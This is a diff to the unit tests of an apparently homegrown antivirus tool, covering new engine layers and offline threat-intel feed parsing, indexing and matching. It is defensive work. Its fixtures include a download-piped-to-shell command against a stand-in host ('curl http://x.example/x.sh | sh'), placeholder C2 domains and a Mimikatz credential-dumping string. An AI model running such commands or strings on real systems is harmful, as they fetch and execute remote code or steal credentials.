@@ -393,8 +393,12 @@ class BehaviorTests(unittest.TestCase):
     def test_non_executable_document_not_analysed(self):
         # Same dangerous text, but in a .txt document -> not executable-looking.
         findings = self._scan("notes.txt", "curl http://x.example/x.sh | sh\n")
+        # …so the *behaviour* layer stays out of it,
         self.assertEqual(self._behavior(findings), [])
-        self.assertEqual(findings, [])
+        # …but v2.8's technique-indicator layer reports the download pipe.
+        self.assertEqual(len(findings), 1)
+        self.assertEqual(findings[0].kind, "indicator")
+        self.assertIn("piped into a shell", findings[0].name)
 
     def test_suid_executable_flagged(self):
         p = self.base / "suid.sh"
@@ -3815,13 +3819,16 @@ class RealworldTests(unittest.TestCase):
         base = Path(tempfile.mkdtemp(prefix="av-rwcorpus-"))
         self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
         files = build_corpus(base)
-        self.assertEqual(len(files), 17)
+        from antivirus.realworld import _corpus_files
+        self.assertEqual(len(files), len(_corpus_files()))
+        self.assertGreaterEqual(len(files), 90)
         # every non-EICAR sample carries the inert header (or is a clean
         # file); the XMRig config is valid JSON and instead carries the
         # documented pool IOC only
         for p in files:
             data = p.read_bytes()
-            if p.name in ("eicar-test.txt", "xmrig-config.json"):
+            if p.name in ("eicar-test.txt", "xmrig-config.json",
+                          "stratum-config.json"):
                 continue
             self.assertTrue(
                 data.startswith(b"INERT DEMO") or p.name.startswith("clean-"),
@@ -3894,11 +3901,11 @@ class EngineTests(unittest.TestCase):
         r = engine.engine_report(f, self.app.scanner, self.app.config)
         self.assertGreaterEqual(r["engines_detected"], 2)
         self.assertEqual(r["overall_severity"], "critical")
-        self.assertIn("of 9", r["consensus"])
+        self.assertIn("of 11", r["consensus"])
+        self.assertEqual(len(r["layers"]), 11)
         by = {l["engine"]: l for l in r["layers"]}
         self.assertEqual(by["hash"]["verdict"], "flagged")
         self.assertEqual(by["pattern"]["verdict"], "flagged")
-        self.assertEqual(len(r["layers"]), 9)
 
     def test_clean_file_not_detected(self):
         from antivirus import engine
@@ -4008,7 +4015,7 @@ class EngineApiTests(WebConsoleTests):
         self.assertEqual(code, 200)
         self.assertGreaterEqual(data["engines_detected"], 2)
         self.assertEqual(data["overall_severity"], "critical")
-        self.assertEqual(len(data["layers"]), 9)
+        self.assertEqual(len(data["layers"]), 11)
 
     def test_engine_missing_param(self):
         code, data = self._req("GET", "/api/engine")
@@ -4442,17 +4449,19 @@ class V27EngineTests(unittest.TestCase):
         self.base = base
         self.app = App(base)
 
-    def test_nine_engines_reported(self):
+    def test_eleven_engines_reported(self):
         from antivirus import engine
 
         f = self.base / "eicar.txt"
         f.write_bytes(EICAR)
         r = engine.engine_report(f, self.app.scanner, self.app.config)
-        self.assertEqual(r["engines_total"], 9)
-        self.assertEqual(len(r["layers"]), 9)
+        self.assertEqual(r["engines_total"], 11)
+        self.assertEqual(len(r["layers"]), 11)
         names = [l["engine"] for l in r["layers"]]
         self.assertIn("polyglot", names)
         self.assertIn("obfuscation", names)
+        self.assertIn("indicators", names)
+        self.assertIn("feeds", names)
 
     def test_polyglot_and_obfuscation_verdicts(self):
         from antivirus import engine
@@ -4476,6 +4485,304 @@ class V27EngineTests(unittest.TestCase):
         f.write_text("hello world\n" * 200)
         r = engine.engine_report(f, self.app.scanner, self.app.config)
         self.assertEqual(r["consensus"], "not detected by any engine")
+
+
+# ---------------------------------------------------------------- feeds (v2.9)
+class FeedTests(unittest.TestCase):
+    """Public threat-intel feeds: parsers, indexes, lookups, integration.
+
+    Everything here is offline: the fetcher is injected, so these tests never
+    touch the network and never depend on a feed being reachable.
+    """
+
+    def setUp(self):
+        from antivirus import feeds as feeds_mod
+
+        self.feeds = feeds_mod
+        base = Path(tempfile.mkdtemp(prefix="av-feeds-"))
+        self.addCleanup(lambda: shutil.rmtree(base, ignore_errors=True))
+        self.base = base
+        self.root = base / "feeds"
+
+    def _build(self, blobs, sources=("blocklistproject-malware",
+                                     "mandiant-hashes", "mandiant-yara"),
+                benign=()):
+        chosen = [self.feeds.SOURCES_BY_ID[i] for i in sources]
+        return self.feeds.build(chosen, self.root, fetch=lambda s: blobs[s.id],
+                                benign=benign)
+
+    # ------------------------------------------------------------- parsers
+    def test_hosts_parser_handles_all_three_forms(self):
+        text = ("# comment\n"
+                "0.0.0.0 malware.example.com\n"
+                "127.0.0.1\tads.example.net\n"
+                "bare.example.org\n"
+                "0.0.0.0 localhost\n"          # plumbing, dropped
+                "0.0.0.0 something.invalid\n"  # .invalid, dropped
+                "\n")
+        values = [i.value for i in self.feeds.parse_hosts(text)]
+        self.assertEqual(values, ["malware.example.com", "ads.example.net",
+                                  "bare.example.org"])
+
+    def test_ip_parser_rejects_placeholders_and_accepts_hosts_form(self):
+        text = "1.2.3.4\n0.0.0.0\n127.0.0.1\n255.255.255.255\n" \
+               "0.0.0.0 5.6.7.8\n10.0.0.9\n"
+        values = [i.value for i in self.feeds.parse_ip_list(text)]
+        self.assertEqual(values, ["1.2.3.4", "5.6.7.8", "10.0.0.9"])
+
+    def test_hash_csv_parses_three_columns(self):
+        row = ("013c7708f1343d684e3571453261b586,"
+               "5968670c0345b0ab5404bd84cb60d7af7a625020,"
+               "77bdcb2a9873c4629d8675c8ce9cc8a0cf35c514e27f7a6dc2bc4b31f79dd9e2")
+        found = {(i.kind, i.value) for i in self.feeds.parse_hash_csv(
+            "md5,sha1,sha256\n" + row + "\n")}
+        self.assertEqual({k for k, _ in found}, {"md5", "sha1", "sha256"})
+
+    def test_yara_parser_keeps_only_faithful_literals(self):
+        text = ('rule X {\n'
+                '  strings:\n'
+                '    $a = "execution policy bypass" ascii wide\n'
+                '    $b = { 6A 40 68 00 30 00 00 }\n'
+                '    $c = /some.*regex/\n'
+                '    $d = "ExitProcess"\n'        # bare API name: unusable
+                '    $e = "short"\n'
+                '  condition: any of them\n'
+                '}\n')
+        values = [i.value for i in self.feeds.parse_yara_literals(text)]
+        self.assertEqual(values, ["execution policy bypass"])
+
+    def test_yara_literal_specificity_rule(self):
+        self.assertTrue(self.feeds.yara_literal_ok("C:\\Windows\\Temp\\x.exe"))
+        self.assertTrue(self.feeds.yara_literal_ok("beacon.dll"))
+        self.assertFalse(self.feeds.yara_literal_ok("ExitProcess"))
+        self.assertFalse(self.feeds.yara_literal_ok("GetStdHandle"))
+        self.assertFalse(self.feeds.yara_literal_ok("short"))
+
+    def test_clamav_hdb_and_ndb_parsing(self):
+        hdb = ("71e7b604d18aefd839e51a39c88df8383bb4c071dc31f87f00a2b5df580d4495"
+               ":544:ClamAV-Test-File\n")
+        kinds = {i.kind for i in self.feeds.parse_clamav_hdb(hdb)}
+        self.assertEqual(kinds, {"sha256"})
+
+        skipped = {}
+        ndb = ("Test.Sig:0:0:434c414d41562d544553542d535452494e47\n"   # literal
+               "Test.Wild:0:*:4d5a??90*\n")                             # wildcard
+        out = list(self.feeds.parse_clamav_ndb(ndb, skipped))
+        self.assertEqual(len(out), 1)
+        self.assertEqual(skipped.get("ndb-wildcard"), 1)
+
+    def test_clamav_cvd_container_is_unpacked(self):
+        # Build a synthetic CVD: 512-byte ASCII header + gzip + tar.
+        import gzip as gz
+        import tarfile as tf
+
+        members = {"COPYING": b"x", "test.hdb": b"00" * 16 + b"",
+                   "test.ndb": b"Name:0:0:41414141414141414141414141414141\n"}
+        buffer = io.BytesIO()
+        with tf.open(fileobj=buffer, mode="w") as archive:
+            for name, blob in members.items():
+                info = tf.TarInfo(name)
+                info.size = len(blob)
+                archive.addfile(info, io.BytesIO(blob))
+        header = b"ClamAV-VDB:" + b" " * (512 - len("ClamAV-VDB:"))
+        cvd = self.base / "test.cvd"
+        cvd.write_bytes(header + gz.compress(buffer.getvalue()))
+
+        skipped = {}
+        out = list(self.feeds.parse_clamav_file(cvd, skipped=skipped))
+        self.assertTrue(any(i.name == "Name" for i in out))
+        self.assertEqual(skipped.get("cvd-other-members"), 1)
+
+    # ---------------------------------------------------------- index/lookup
+    def test_build_write_lookup_roundtrip(self):
+        blobs = {
+            "blocklistproject-malware":
+                b"0.0.0.0 malware-c2.example.com\n0.0.0.0 drop.evil.example.net\n",
+            "mandiant-hashes":
+                b"md5,sha1,sha256\n00,00," + b"77" * 32 + b"\n",
+            "mandiant-yara":
+                b'rule T { strings: $s = "invoke-mimikatz -dumpcr" }',
+        }
+        report = self._build(blobs)
+        self.assertGreater(report.total_tokens, 2)
+
+        db = self.feeds.FeedDB(self.root)
+        hit = db.lookup_domain("malware-c2.example.com")
+        self.assertIsNotNone(hit)
+        self.assertEqual(hit["tier"], "high")
+        self.assertIn("MIT", [s["license"] for s in hit["sources"]])
+        self.assertIsNone(db.lookup_domain("innocent.example.org"))
+        self.assertIsNotNone(db.lookup_hash(sha256="77" * 32))
+        self.assertEqual(len(db.patterns()), 1)
+        self.assertTrue(self.feeds.verify(self.root)["ok"])
+
+    def test_build_merges_instead_of_clobbering(self):
+        blobs = {"blocklistproject-malware": b"0.0.0.0 first.example.com\n",
+                 "mandiant-hashes": b"md5,sha1,sha256\n",
+                 "mandiant-yara": b""}
+        self._build(blobs)
+        blobs["blocklistproject-malware"] = b"0.0.0.0 second.example.com\n"
+        self._build(blobs)
+        db = self.feeds.FeedDB(self.root)
+        self.assertIsNotNone(db.lookup_domain("first.example.com"))
+        self.assertIsNotNone(db.lookup_domain("second.example.com"))
+
+    def test_source_severity_decides_bucket(self):
+        blobs = {"blocklistproject-ransomware":
+                 b"0.0.0.0 locker.example.com\n"}
+        report = self.feeds.build(
+            [self.feeds.SOURCES_BY_ID["blocklistproject-ransomware"]],
+            self.root, fetch=lambda s: blobs[s.id])
+        self.assertEqual(list(report.indexes), ["domain.critical"])
+        hit = self.feeds.FeedDB(self.root).lookup_domain("locker.example.com")
+        self.assertEqual(hit["tier"], "critical")
+
+    def test_duplicates_are_counted_not_double_counted(self):
+        blobs = {"blocklistproject-malware": b"0.0.0.0 dup.example.com\n",
+                 "blocklistproject-abuse": b"0.0.0.0 dup.example.com\n"}
+        report = self.feeds.build(
+            [self.feeds.SOURCES_BY_ID["blocklistproject-malware"],
+             self.feeds.SOURCES_BY_ID["blocklistproject-abuse"]],
+            self.root, fetch=lambda s: blobs[s.id])
+        abuse = [s for s in report.sources if s["id"] == "blocklistproject-abuse"][0]
+        self.assertEqual(abuse["tokens"], 0)
+        self.assertEqual(abuse["duplicates"], 1)
+        self.assertEqual(report.indexes["domain.high"]["count"], 1)
+
+    def test_benign_corpus_gate_drops_false_positive_patterns(self):
+        blobs = {
+            "blocklistproject-malware": b"0.0.0.0 x.example.com\n",
+            "mandiant-hashes": b"md5,sha1,sha256\n",
+            "mandiant-yara":
+                b'rule T { strings: $a = "harmless marker text here" '
+                b'$b = "very distinctive c2 string 42" }',
+        }
+        strict = self._build(blobs, benign=[b"this file says harmless marker text here"])
+        self.assertEqual(strict.patterns, 1)
+        self.assertGreaterEqual(strict.skipped.get("pattern-benign-match", 0), 1)
+
+    def test_patterns_must_be_prefilter_gated(self):
+        # A pattern with nothing memchr-able would be tested on every byte.
+        self.assertIsNone(self.feeds._pattern_signature(
+            self.feeds.SOURCES_BY_ID["mandiant-yara"], ".."))
+
+    def test_clear_removes_the_database(self):
+        self._build({"blocklistproject-malware": b"0.0.0.0 a.example.com\n",
+                     "mandiant-hashes": b"md5,sha1,sha256\n",
+                     "mandiant-yara": b""})
+        self.assertTrue(self.feeds.FeedDB(self.root).built)
+        self.feeds.clear(self.root)
+        self.assertFalse(self.feeds.FeedDB(self.root).built)
+
+    def test_source_manifest_is_licence_complete(self):
+        allowed = {"redistributable", "runtime-only"}
+        for source in self.feeds.SOURCES:
+            self.assertIn(source.redistribution, allowed, source.id)
+            self.assertTrue(source.license, source.id)
+            self.assertTrue(source.license_url.startswith("https://"),
+                            source.id)
+            self.assertTrue(source.repo and source.path, source.id)
+        ids = [s.id for s in self.feeds.SOURCES]
+        self.assertEqual(len(ids), len(set(ids)))
+
+    # ------------------------------------------------------- content matching
+    def test_contextual_matching_ignores_code_lookalikes(self):
+        self._build({"blocklistproject-malware":
+                     b"0.0.0.0 subprocess.run\n0.0.0.0 s.id\n"
+                     b"0.0.0.0 malware-c2.example.com\n",
+                     "mandiant-hashes": b"md5,sha1,sha256\n",
+                     "mandiant-yara": b""})
+        db = self.feeds.FeedDB(self.root)
+        # code look-alikes: no network context, not specific enough
+        self.assertEqual(db.audit_content("code.py", b"i.id, s.id = 1, 2\n"), [])
+        self.assertEqual(db.audit_content(
+            "code.py", b"subprocess.run(['ls'])\n"), [])
+        # real network context is still matched
+        self.assertEqual(len(db.audit_content(
+            "evil.py", b"url = 'http://malware-c2.example.com/x'\n")), 1)
+        self.assertEqual(len(db.audit_content(
+            "hosts", b"0.0.0.0 malware-c2.example.com\n")), 1)
+        self.assertEqual(len(db.audit_content(
+            "evil.py", b"c2 = 'malware-c2.example.com:8080'\n")), 1)
+
+    def test_audit_content_respects_limits(self):
+        lines = b"".join(b"0.0.0.0 evil%d.example.com\n" % i for i in range(20))
+        self._build({"blocklistproject-malware": lines,
+                     "mandiant-hashes": b"md5,sha1,sha256\n",
+                     "mandiant-yara": b""})
+        db = self.feeds.FeedDB(self.root)
+        content = b"\n".join(b"http://evil%d.example.com/x" % i for i in range(10))
+        self.assertLessEqual(len(db.audit_content("f", content, max_findings=3)), 3)
+        self.assertLessEqual(len(db.extract_tokens(content, limit=4)), 4)
+
+    # ----------------------------------------------------------- integration
+    def test_scanner_reports_feed_iocs_and_hashes(self):
+        payload = b"MZ" + b"\x00" * 200 + b"http://malware-c2.example.com/x"
+        sha = hashlib.sha256(payload).hexdigest()
+        row = f"{'00' * 16},{'11' * 20},{sha}\n"
+        self._build({
+            "blocklistproject-malware": b"0.0.0.0 malware-c2.example.com\n",
+            "mandiant-hashes": ("md5,sha1,sha256\n" + row).encode(),
+            "mandiant-yara": b""})
+
+        config = Config()
+        config.feeds_dir = self.root
+        config.cache_enabled = False
+        scanner = Scanner(config, SignatureDB(Path("data/signatures.json")))
+
+        evil = self.base / "evil.bin"
+        evil.write_bytes(payload)
+        findings = scanner.scan_file(evil)
+        kinds = {f.kind for f in findings}
+        self.assertIn("signature-hash", kinds)     # hash feed hit
+
+        script = self.base / "loader.py"
+        script.write_text("url = 'http://malware-c2.example.com/panel'\n")
+        findings = scanner.scan_file(script)
+        self.assertTrue(any(f.kind == "feed-ioc" for f in findings))
+
+    def test_missing_database_changes_nothing(self):
+        config = Config()
+        config.feeds_dir = self.base / "does-not-exist"
+        config.cache_enabled = False
+        scanner = Scanner(config, SignatureDB(Path("data/signatures.json")))
+        self.assertFalse(scanner.feeds().built)
+        f = self.base / "note.txt"
+        f.write_text("hello\n" * 50)
+        self.assertEqual(scanner.scan_file(f), [])
+
+    def test_feed_index_files_are_never_scanned(self):
+        self._build({"blocklistproject-malware":
+                     b"0.0.0.0 malware-c2.example.com\n",
+                     "mandiant-hashes": b"md5,sha1,sha256\n",
+                     "mandiant-yara": b""})
+        config = Config()
+        config.feeds_dir = self.root
+        config.cache_enabled = False
+        scanner = Scanner(config, SignatureDB(Path("data/signatures.json")))
+        for path in self.root.rglob("*"):
+            if path.is_file():
+                self.assertTrue(scanner._is_self_file(path), str(path))
+
+    def test_feeds_cli_and_version_reporting(self):
+        from antivirus import cli
+
+        self._build({"blocklistproject-malware":
+                     b"0.0.0.0 malware-c2.example.com\n",
+                     "mandiant-hashes": b"md5,sha1,sha256\n",
+                     "mandiant-yara": b""})
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            code = cli.main(["feeds", "list", "--json"])
+        self.assertEqual(code, 0)
+        rows = json.loads(buffer.getvalue())
+        self.assertTrue(any(r["id"] == "blocklistproject-malware" for r in rows))
+
+        buffer = io.StringIO()
+        with contextlib.redirect_stdout(buffer):
+            code = cli.main(["version", "--json"])
+        info = json.loads(buffer.getvalue())
+        self.assertIn("feeds", info["engines"])
 
 
 if __name__ == "__main__":
